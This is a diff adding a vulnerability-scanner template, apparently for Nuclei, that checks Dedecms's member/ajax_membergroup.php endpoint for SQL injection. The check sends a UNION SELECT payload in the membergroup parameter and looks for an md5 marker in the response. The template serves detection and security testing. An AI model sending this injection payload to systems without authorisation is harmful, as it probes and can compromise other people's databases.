@@ -1,0 +1,23 @@
+id: dedecms-membergroup-sqli
+info:
+  name: Dedecms Membergroup SQL Injection
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the Dedecms Membergroup functionality.
+variables:
+  rand: "{{rand_int(10000, 21000)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{rand}})+--+@`'`"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
